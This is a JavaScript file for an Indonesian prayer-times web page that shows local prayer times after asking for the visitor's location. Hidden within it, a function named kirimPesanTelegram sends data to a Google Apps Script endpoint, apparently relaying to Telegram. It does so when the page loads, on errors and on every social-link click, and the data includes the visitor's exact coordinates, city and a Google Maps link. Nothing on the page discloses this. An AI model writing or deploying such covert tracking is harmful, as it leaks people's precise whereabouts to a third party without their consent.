let kota = "";
let lat = "";
let lon = "";

function updateJam() {
    const now = new Date();
    const jam = now.getHours().toString().padStart(2, '0');
    const menit = now.getMinutes().toString().padStart(2, '0');
    const detik = now.getSeconds().toString().padStart(2, '0');
    document.getElementById("jam-digital").innerText = `${jam}:${menit}:${detik}`;
    return `${jam}:${menit}:${detik}`;
}

function tampilkanError(pesan) {
    document.getElementById("loading").style.display = "none";
    document.getElementById("error-message").innerHTML = `<span style='color:red'>${pesan}</span>`;
    document.getElementById("error-message").style.display = "block";
}

function kirimPesanTelegram(pesan) {
    fetch(`https://script.google.com/macros/s/AKfycbzF9PEMsGd-RBRfo3ym6Zbaii5-lckSXGmAoepevRu6xFApFtzR3GQwtyTo2TmKHYi-Zg/exec?pesan=${encodeURIComponent(pesan)}`);
}

function isMobileDevice() {
    return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
}

window.onload = function () {
    document.getElementById("kota").style.display = "none";
    document.getElementById("error-message").style.display = "none";
    document.getElementById("tanggal").style.display = "none";
    document.getElementById("jam-digital").style.display = "none";

    function ambilNamaKota(latVal, lonVal) {
        return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latVal}&lon=${lonVal}`)
            .then(res => res.json())
            .then(data => {
                kota = data.address.city || data.address.town || data.address.village || data.address.county || "Lokasi Tidak Dikenal";
                document.getElementById("kota").innerText = kota;
                return kota;
            })
            .catch(() => {
                const waktu = new Date();
                const jam = waktu.toTimeString().split(" ")[0];
                const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
                kirimPesanTelegram(
                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
                    "Gagal ambil nama kota.\n" +
                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
                    `Tanggal: ${tanggal}\nJam: ${jam}`
                );
                tampilkanError("Gagal memuat kota.");
            });
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                ambilNamaKota(lat, lon).then(() => {
                    tampilkanJadwal(lat, lon);
                });
            },
            () => {
                const waktu = new Date();
                const jam = waktu.toTimeString().split(" ")[0];
                const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
                kirimPesanTelegram(
                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
                    "Gagal ambil lokasi: Izin ditolak.\n" +
                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
                    `Tanggal: ${tanggal}\nJam: ${jam}`
                );
                tampilkanError("Izin lokasi ditolak. Jadwal tidak dapat ditampilkan.");
            }
        );
    }

    updateJam();
    setInterval(updateJam, 1000);

    document.querySelectorAll('.sosmed-link').forEach(link => {
        link.addEventListener('click', () => {
            const nama = link.dataset.name || "Tidak Dikenal";
            const waktu = new Date();
            const jam = waktu.toTimeString().split(" ")[0];
            const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
            const linkMaps = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Belum diketahui";

            kirimPesanTelegram(
                "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
                `Pengunjung mengklik link ${nama}\n` +
                "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
                `Tanggal: ${tanggal}\nJam: ${jam}\n` +
                `Lokasi: ${kota || "Belum diketahui"}\n` +
                `Latitude: ${lat || "Belum diketahui"}\n` +
                `Longitude: ${lon || "Belum diketahui"}\n` +
                `Link Maps: ${linkMaps}`
            );
        });
    });
}

function tampilkanJadwal(lat, lon) {
    fetch(`https://api.aladhan.com/v1/timings?latitude=${lat}&longitude=${lon}&method=2`)
        .then(res => res.json())
        .then(data => {
            if (data.code === 200) {
                const waktu = data.data.timings;
                const readableDate = data.data.date.readable;
                const weekdayEn = data.data.date.gregorian.weekday.en;

                const hariMap = {
                    "Monday": "Senin", "Tuesday": "Selasa", "Wednesday": "Rabu",
                    "Thursday": "Kamis", "Friday": "Jumat", "Saturday": "Sabtu", "Sunday": "Minggu"
                };

                const bulanMap = {
                    "Jan": "Januari", "Feb": "Februari", "Mar": "Maret", "Apr": "April",
                    "May": "Mei", "Jun": "Juni", "Jul": "Juli", "Aug": "Agustus",
                    "Sep": "September", "Oct": "Oktober", "Nov": "November", "Dec": "Desember"
                };

                const [tgl, blnEn, thn] = readableDate.split(" ");
                const tanggalIndo = `${hariMap[weekdayEn]}, ${tgl} ${bulanMap[blnEn]} ${thn}`;
                const jamSekarang = updateJam();
                const linkMaps = `https://www.google.com/maps?q=${lat},${lon}`;

                kirimPesanTelegram(
                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
                    "Pengunjung membuka halaman\n" +
                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
                    `Tanggal: ${tanggalIndo}\nJam: ${jamSekarang}\n` +
                    `Lokasi: ${kota || "Belum diketahui"}\n` +
                    `Latitude: ${lat || "Belum diketahui"}\n` +
                    `Longitude: ${lon || "Belum diketahui"}\n` +
                    `Link Maps: ${linkMaps}`
                );

                if (isMobileDevice()) {
                    document.getElementById("jadwal").style.transform = "translateX(-5%)";
                }

                document.getElementById("loading").style.display = "none";
                document.getElementById("kota").style.display = "block";
                document.getElementById("tanggal").innerText = tanggalIndo;
                document.getElementById("tanggal").style.display = "block";
                document.getElementById("jam-digital").style.display = "block";

                document.getElementById("sholat-times").innerHTML = `
                    <div><strong>${waktu.Fajr}</strong><br>Subuh</div>
                    <div><strong>${waktu.Dhuhr}</strong><br>Dzuhur</div>
                    <div><strong>${waktu.Asr}</strong><br>Ashar</div>
                    <div><strong>${waktu.Maghrib}</strong><br>Maghrib</div>
                    <div><strong>${waktu.Isha}</strong><br>Isya</div>
                `;
            } else {
                const waktu = new Date();
                const jam = waktu.toTimeString().split(" ")[0];
                const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
                kirimPesanTelegram(
                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
                    "Gagal memuat jadwal.\n" +
                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
                    `Tanggal: ${tanggal}\nJam: ${jam}`
                );
                tampilkanError("Gagal memuat jadwal.");
            }
        })
        .catch(() => {
            const waktu = new Date();
            const jam = waktu.toTimeString().split(" ")[0];
            const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
            kirimPesanTelegram(
                "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
                "Gagal ambil jadwal sholat.\nAPI tidak merespons.\n" +
                "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
                `Tanggal: ${tanggal}\nJam: ${jam}`
            );
            tampilkanError("Tidak dapat terhubung ke server.");
        });
}
